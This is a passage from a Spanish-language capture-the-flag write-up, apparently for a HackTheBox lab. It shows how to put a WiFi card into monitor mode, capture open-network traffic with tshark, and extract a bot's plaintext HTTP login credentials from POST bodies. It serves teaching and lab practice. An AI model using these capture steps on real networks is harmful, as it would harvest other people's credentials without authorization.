# 2 · Network Sniffing  (T1040)

!!! info "Terminología: monitoreo, no interceptación"
    Aunque el nombre (de MITRE) sea "Network Sniffing", mecánicamente es **monitoreo pasivo**: el
    modo monitor **solo escucha** el canal. **No** tocamos ni suplantamos ninguna MAC, **no**
    inyectamos nada. "Sniffing" aquí = *oír*, no *interceptar*.

**Objetivo:** obtener credenciales de alguien que use la red (concluimos: `jenny / Fl1ghtDeck2026!`).

## 2.1 · ¿Qué nos empuja a MIRAR el tráfico?

Premisas que **sí** teníamos de antemano:

1. **¿Por qué el box te da DOS interfaces WiFi?** Con `wlan2` ya te mantienes conectado a la red;
   `wlan3` (simulada, libre) **sobra** para eso. ¿Para qué querrías una segunda tarjeta WiFi? Para
   **escuchar el aire** sin sacrificar tu conexión. Es un guiño fuerte del diseñador.
2. Estás en el grupo **`wireshark`** y tienes **`sudo`** (+ `tshark` preinstalado) → el box te dio
   **justo los permisos para capturar tráfico**. Invitación, no coincidencia.
3. La red es **WiFi abierta** (sin cifrado) → *cualquiera en el canal* ve el tráfico de *todos*.
4. **No tenemos** credenciales del portal → hay que conseguirlas de algún lado.

→ **Hipótesis** (no certeza): *"si alguien más usa esta red abierta, puedo leer lo que manda."*
Monitoreamos justamente para **comprobarlo**.

!!! warning "Lo que AVERIGUAMOS al analizar la captura (no se sabía antes)"
    - que hay un **bot** que se loguea periódicamente a `portal.international.htb/miles/login.php`, y
    - que lo hace por **HTTP en claro** (sin TLS).

    El *bot + HTTP* es el **hallazgo** del monitoreo, **no** la razón para monitorear.

## 2.2 · Managed vs Monitor (por qué hace falta el modo monitor)

- **Managed** (modo normal): la tarjeta te entrega **solo** las tramas dirigidas a **tu** MAC. Inútil para espiar.
- **Monitor**: la tarjeta te entrega **todas** las tramas del canal, de cualquier emisor. Ese es el punto.

## 2.3 · Lo que hicimos

**Capturar — `wlan3` en modo monitor**

El modo monitor solo sirve si estás **en el mismo canal** que la red objetivo (si no, no oyes nada):

```bash
iw dev wlan2 info | grep channel      # ¿en qué canal está la red?
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel <N>          # el mismo canal que wlan2

tshark -i wlan3 -w air.pcap           # captura cruda (unos minutos)
```

??? question "¿Por qué `tshark` y no Wireshark o `tcpdump`? (clic)"
    - **`tcpdump`** → genial para **capturar** (ligero, está en todas partes), pero flojo para
      **analizar**: no diseca bien la capa de aplicación, ni trae jerarquía de protocolos ni los
      filtros de display de Wireshark.
    - **Wireshark** → el mejor analizador… pero es **GUI**: en un box headless / por RDP es incómodo,
      no es scriptable y aquí ni siquiera está instalado.
    - **`tshark`** → es **Wireshark en línea de comandos**: los mismos disectores y filtros potentes
      (`-Y`, `-z`, `-T fields`) pero en terminal → **scriptable, headless, ligero**. Lo mejor de los
      dos. Y el box ya lo trae (+ el grupo `wireshark` te da permiso de captura).

**Analizar el `.pcap` — tres preguntas**

*1) ¿Quién trafica?* (qué estaciones están activas)

```bash
tshark -r air.pcap -q -z endpoints,wlan   # MACs 802.11 activas en el aire
tshark -r air.pcap -q -z conv,ip          # conversaciones IP: quién habla con quién
```

??? note "Output: `endpoints,wlan` — MACs activas (clic)"
    ```text
    IEEE 802.11 Endpoints
                           |  Packets | |  Bytes | | Tx Pkts | | Rx Pkts |
    02:00:00:00:00:00          1422      179130      1385          37
    Broadcast                  1385      177280         0        1385
    02:00:00:00:02:00           181       28439       146          35
    c2:95:6e:e8:cc:83           147       26739        35         112
    02:00:00:00:01:00            81       32466        45          36
    Xensource_60:a3:1e           78       32316        36          42
    ```

    - **`02:00:00:00:00:00`** → 1385 Tx **todas a Broadcast** = las mismas **1385 `wlan.mgt`**
      (beacons) del `io,phs` → es el **AP** emitiendo beacons. El que más "habla", pero **ruido**.
    - **`02:00:00:00:02:00`** → **tu propia `wlan2`** (MAC idéntica a la de tu `ip a`).
    - **`02:00:00:00:01:00`** (81) y **`Xensource_60:a3:1e`** (78) → **otras dos estaciones**; el OUI
      *Xensource* = `00:16:3e` marca un host tipo Xen/LXD.
    - `c2:95:6e:e8:cc:83` (147) → estación con **MAC aleatorizada** (localmente administrada: el
      primer octeto `c2` lleva el bit "local").

??? note "Output: `conv,ip` — conversaciones IP (clic)"
    ```text
    IPv4 Conversations
    10.13.37.182  <->  10.13.37.1     139 frames   26 kB     (dura 139 s)
    10.13.37.132  <->  10.13.37.10     66 frames   31 kB     (empieza a los 24 s)
    ```

    - **`10.13.37.182 <-> 10.13.37.1`** → **tú** (`wlan2` = .182, de tu `ip a`) con el **gateway**
      (.1): **139 tramas** repartidas a lo largo de **139 s**. Es tu propio tráfico.
    - **`10.13.37.132 <-> 10.13.37.10`** → **otro cliente (`.132`, que no eres tú) hablando con
      `.10`**; y **arranca a los 24 s**, no desde el inicio. `.10` es el host del portal (lo confirma
      el `http.host` de más abajo). → **Esta es la conversación que importa.**

*2) ¿Qué protocolos hay?* (la jerarquía lo resume de un vistazo)

```bash
tshark -r air.pcap -q -z io,phs           # protocol hierarchy statistics
```

??? note "Output: `io,phs` — jerarquía de protocolos (clic)"
    ```text
    wlan                       frames:1649
      wlan.mgt                 frames:1385     ← gestión 802.11 (beacons): el 84% del total
      llc                      frames:227
        ip                     frames:205
          udp → dns            frames:96       ← resolución de nombres
          tcp                  frames:109
            http               frames:12       ← ¡HTTP! (sin TLS)
              urlencoded-form  frames:3        ← cuerpos de formulario (aquí van user/pass)
              data-text-lines  frames:6
        arp                    frames:20       ← solo 20 ARP
    ```

    - **`wlan.mgt` = 1385** (de 1649) → los **beacons dominan** la captura, como en cualquier WiFi
      real. Es el ruido que esperabas.
    - **`arp` = 20** → ARP es **escaso** en esta red pequeña: nada de inundación.
    - **`http` = 12**, y dentro **`urlencoded-form` = 3** → ahí está la aguja: **3 envíos de
      formulario** por HTTP. Esos son los logins.

→ El objetivo se concreta: hay **HTTP sin TLS** con **formularios `POST`**. Vamos a por ellos.

*3) Momento deductivo: ¿dónde viajan las credenciales?*

!!! question "¿Qué protocolos transportan credenciales en claro?"
    Las credenciales de aplicación viajan **legibles** en protocolos **sin cifrar**: **HTTP**
    (formulario de login / Basic auth), **FTP** (`USER`/`PASS`), **Telnet**, **SMTP/POP3/IMAP** sin
    STARTTLS, **SNMP**, **LDAP**… todo lo que **no** vaya envuelto en TLS.

    Y ya sabemos dos cosas de antes: **la página tiene login** y el portal se sirve por **HTTP** (lo
    vimos en la página de bienvenida). → El premio es un **`POST` HTTP** con el formulario.

**Extraer las credenciales**

*Paso 1 — ¿qué peticiones hubo y a dónde?*

```bash
tshark -r air.pcap -Y http.request \
       -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri
```
```text
10.13.37.132  POST  portal.international.htb  /miles/login.php
10.13.37.182  GET   wifi.international.htb    /
10.13.37.132  POST  portal.international.htb  /miles/login.php
10.13.37.182  GET   wifi.international.htb    /
10.13.37.132  POST  portal.international.htb  /miles/login.php
10.13.37.182  GET   wifi.international.htb    /
```

- **`.132` → 3 × `POST`** a `/miles/login.php`, **sin `GET` previo** → postea directo, en bucle.
- **`.182` (tú) → `GET` a `wifi.international.htb/`** → es **tu** carga de la página de bienvenida,
  no el login. Nada que ver con las credenciales.

→ El objetivo son esos **3 POST de `.132`**.

*Paso 2 — ¿puedes ver el HTML del formulario?* (depende de la captura)

Vuelca los cuerpos HTTP a archivos y mira qué salió:

```bash
tshark -r air.pcap --export-objects http,./http_obj
ls ./http_obj/
```
```text
%2f   %2f(1)   %2f(2)            #  2150 B → respuestas a tu GET de wifi.international.htb/
login(1).php  login(3).php …     #  7589 B → respuestas del portal al POST (página post-login)
login.php  login(2).php …        #    39 B → ¡los CUERPOS de los POST! (Content-Length: 39)
```

Dos lecturas:

- **No está el HTML del formulario de login.** El bot nunca hizo `GET /miles/login.php`, así que su
  `<form>` no viajó por el aire → `grep '<form'` **no lo encuentra**. Tu grep vacío estaba en lo cierto.
- **Pero los ficheros de 39 B SON el cuerpo del POST** → atajo directo a las credenciales:
  ```bash
  cat ./http_obj/login.php        # el de 39 bytes
  # username=jenny&password=Fl1ghtDeck2026!
  ```

!!! tip "El grep vacío te dice algo"
    Que no haya `<form>` no es un fallo: **el cliente posteó directo** (lo confirma el `User-Agent` del
    Paso 3). Cuando no hay HTML, los nombres de los campos los lees del **propio cuerpo del POST**,
    que es autoexplicativo (`username=…&password=…`). El HTML es un atajo *cuando está*.

*Paso 3 — ¿dónde están exactamente las credenciales? → en el cuerpo del POST*

Disecciona **un** POST a fondo:

```bash
tshark -r air.pcap -Y 'http.request.method == "POST"' -O http
```
```text
POST /miles/login.php HTTP/1.1
Host: portal.international.htb
User-Agent: curl/8.5.0                 ← ¡el "bot" es curl! → postea directo, sin form
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
    File Data: 39 bytes                ← AQUÍ está el cuerpo = las credenciales
HTML Form URL Encoded: application/x-www-form-urlencoded
```

- **¿Dónde están?** En el **cuerpo del POST**: eso que sale como **`File Data: 39 bytes`** bajo
  `HTML Form URL Encoded`. Ese campo es **`http.file_data`**. `-O http` confirma que **existe**
  (39 bytes url-encoded) pero **no lo imprime** → por eso hay que extraerlo (Paso 4).
- **¿Un POST cualquiera?** No: son **3 POST idénticos** a `/miles/login.php`, cuerpo de 39 B cada
  uno → el bot (`curl`) en bucle. Los tres llevan **lo mismo**; cualquiera vale.
- **`User-Agent: curl/8.5.0`** = prueba dura de que es un **script**, no un navegador → por eso no
  hubo `GET` ni HTML del formulario.

??? question "¿Qué es `http.file_data` y de dónde sale? (clic)"
    Son **dos capas** distintas; no las confundas:

    - **El concepto (HTTP):** una petición es *línea de petición + cabeceras + (opcional) cuerpo*. Aquí
      las **cabeceras se autodocumentan**: `Content-Length: 39` dice que **hay** un cuerpo de 39 B, y
      `Content-Type: application/x-www-form-urlencoded` dice **cómo** está codificado. El cuerpo es lo
      que envió el formulario. Esto lo define la **especificación de HTTP**.
    - **El nombre del campo (Wireshark):** `http.file_data` **no** es un término de HTTP → es la
      **etiqueta que tshark/Wireshark** le ponen a ese cuerpo en su disección. Pertenece al
      *namespace de Wireshark*, no al protocolo.

    **¿Hace falta irse a internet?** No para *entenderlo* —el propio `-O http` te lo enseña—, pero si
    quieres la **fuente autoritativa de cada capa**:

    - el **campo** → pregúntaselo a la herramienta: `tshark -G fields | grep http.file_data` (su
      catálogo oficial de campos), o la *Wireshark Display Filter Reference*.
    - el **concepto** (cuerpo y cabeceras) → la spec de HTTP (**RFC 9110**).

    Mismo principio que con `modinfo` / los registros: **el valor vive en un namespace con dueño →
    pregúntale al dueño.**

*Paso 4 — extraer y decodificar*

Primero saca el cuerpo crudo. Sale en **hex**, y hay **3 líneas idénticas** (los 3 POST del bot):

```bash
tshark -r air.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data
```
```text
757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621
757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621
757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621
```

Ahora decodifica **uno** (los tres son iguales):

```bash
tshark -r air.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data \
       | head -1 | xxd -r -p
# username=jenny&password=Fl1ghtDeck2026!
```

!!! note "¿Por qué `head -1`?"
    Ves las **3** líneas de hex arriba (los 3 POST idénticos). Sin `head -1`, `xxd -r -p` las
    concatenaría y verías la credencial repetida 3×. Con `head -1` decodificas solo el primero.

??? question "¿Por qué `xxd -r -p`? (el hex y su vuelta) — clic"
    `-T fields -e http.file_data` **no** imprime texto: `http.file_data` es un campo de **bytes**, y
    tshark los representa como una **cadena hexadecimal continua** →
    `757365726e616d653d6a656e6e79…`. Para leerla hay que convertir ese hex de vuelta a texto:

    - **`xxd`** por defecto hace un *hexdump*: **bytes → hex**.
    - **`-r`** = **reverse**: lo contrario, **hex → bytes**.
    - **`-p`** = **plain** (postscript): una **tira continua de hex, sin offsets de dirección ni
      columna ASCII**. Es justo el formato que suelta tshark; **sin `-p`**, `xxd -r` esperaría el
      formato clásico (con direcciones) y no decodificaría bien.

    `xxd -r -p` = *"toma esta tira de hex plana y devuélvemela como bytes"* →
    `username=jenny&password=Fl1ghtDeck2026!`.

    💡 Atajo: `tshark … -e http.file_data | xxd -r -p` es el idiom; también podrías añadir
    `| tr '&' '\n'` para ver cada campo en su línea.

## 2.4 · Conclusión

**`jenny / Fl1ghtDeck2026!`** — resultó ser usuaria del Control Panel de Craft.

## 2.5 · Rutas alternativas (re-run)

`bettercap`, `airodump-ng` + `hcxdumptool`, `kismet`. Todas llegan a lo mismo: capturar el login
HTTP del bot. Cambia la *técnica*, no la *conclusión*.
